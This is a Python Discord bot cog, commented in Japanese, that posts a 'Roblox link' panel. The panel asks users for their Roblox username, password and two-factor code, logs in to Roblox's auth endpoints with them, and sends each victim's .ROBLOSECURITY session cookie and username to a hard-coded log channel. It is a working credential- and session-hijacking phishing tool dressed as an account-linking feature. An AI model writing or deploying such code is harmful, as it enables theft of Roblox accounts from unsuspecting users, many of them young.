import discord
from discord.ext import commands
from discord import app_commands, ui
import json, os, datetime, requests

LOG_CHANNEL_ID = 1531424660418461880
DATA_FILE = "roblox_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

class RobloxPanelCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="robloxpanel")
    @app_commands.default_permissions(administrator=True)
    async def create_panel(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # カテゴリ選択
        categories = [c for c in interaction.guild.categories]
        view = CategorySelectView(interaction, categories)
        await interaction.followup.send("カテゴリを選択:", view=view, ephemeral=True)

class CategorySelectView(ui.View):
    def __init__(self, interaction, categories):
        super().__init__(timeout=180)
        self.interaction = interaction
        
        for i, cat in enumerate(categories[:5]):
            self.add_item(ui.Button(label=cat.name, custom_id=f"cat_{cat.id}"))

    async def interaction_check(self, interaction: discord.Interaction):
        cat_id = int(interaction.data["custom_id"].split("_")[1])
        category = self.interaction.guild.get_channel(cat_id)
        
        # チャンネル選択
        channels = [c for c in category.text_channels]
        view = ChannelSelectView(self.interaction, channels)
        await interaction.response.edit_message(content="チャンネルを選択:", view=view)

class ChannelSelectView(ui.View):
    def __init__(self, interaction, channels):
        super().__init__(timeout=180)
        self.interaction = interaction
        
        for i, ch in enumerate(channels[:5]):
            self.add_item(ui.Button(label=ch.name, custom_id=f"ch_{ch.id}"))

    async def interaction_check(self, interaction: discord.Interaction):
        ch_id = int(interaction.data["custom_id"].split("_")[1])
        channel = self.interaction.guild.get_channel(ch_id)
        
        # パネル設置
        embed = discord.Embed(title="Roblox連携", color=discord.Color.blue())
        embed.set_footer(text="Created by @nama_0721")
        await channel.send(embed=embed, view=RobloxLinkView())
        await interaction.response.edit_message(content=f"パネルを {channel.mention} に設置", view=None)

class RobloxLinkView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        
    @ui.button(label="Roblox連携", style=discord.ButtonStyle.green, custom_id="roblox_link")
    async def link_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(RobloxLoginModal())

class RobloxLoginModal(ui.Modal, title="Robloxログイン"):
    username = ui.TextInput(label="ユーザー名", required=True)
    password = ui.TextInput(label="パスワード", style=discord.TextStyle.paragraph, required=True)
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # ログイン処理
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        
        # ログイン試行
        resp = session.post("https://auth.roblox.com/v2/login", 
                           json={"username": self.username.value, "password": self.password.value})
        
        if resp.status_code == 200:
            # ログイン成功
            cookies = session.cookies.get_dict()
            security_cookie = cookies.get(".ROBLOSECURITY", "")
            
            # ログ送信
            log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                embed = discord.Embed(title="Roblox連携完了", color=discord.Color.green())
                embed.add_field(name="Discord", value=interaction.user.mention)
                embed.add_field(name="Robloxユーザー名", value=self.username.value)
                embed.add_field(name="セキュリティクッキー", value=security_cookie[:50] + "...")
                await log_channel.send(embed=embed)
            
            await interaction.followup.send("連携完了！", ephemeral=True)
            
        elif resp.status_code == 403:
            # 二段階認証
            csrf = resp.headers.get("X-CSRF-TOKEN", "")
            modal = RobloxCaptchaModal(self.username.value, self.password.value, csrf, session)
            await interaction.followup.send_modal(modal)
        else:
            await interaction.followup.send(f"ログイン失敗: {resp.status_code}", ephemeral=True)

class RobloxCaptchaModal(ui.Modal, title="二段階認証"):
    def __init__(self, username, password, csrf, session):
        super().__init__()
        self.username = username
        self.password = password
        self.csrf = csrf
        self.session = session
        
    code = ui.TextInput(label="認証コード", required=True, max_length=6, min_length=6)
    
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # 二段階認証処理
        headers = {"X-CSRF-TOKEN": self.csrf}
        resp = self.session.post("https://auth.roblox.com/v2/login/twofactor/verify",
                                json={"code": self.code.value}, headers=headers)
        
        if resp.status_code == 200:
            cookies = self.session.cookies.get_dict()
            security_cookie = cookies.get(".ROBLOSECURITY", "")
            
            # ログ送信
            log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
            if log_channel:
                embed = discord.Embed(title="Roblox連携完了", color=discord.Color.green())
                embed.add_field(name="Discord", value=interaction.user.mention)
                embed.add_field(name="Robloxユーザー名", value=self.username)
                embed.add_field(name="セキュリティクッキー", value=security_cookie[:50] + "...")
                await log_channel.send(embed=embed)
            
            await interaction.followup.send("連携完了！", ephemeral=True)
        else:
            await interaction.followup.send(f"認証失敗: {resp.status_code}", ephemeral=True)

async def setup(bot):
    await bot.add_cog(RobloxPanelCog(bot))
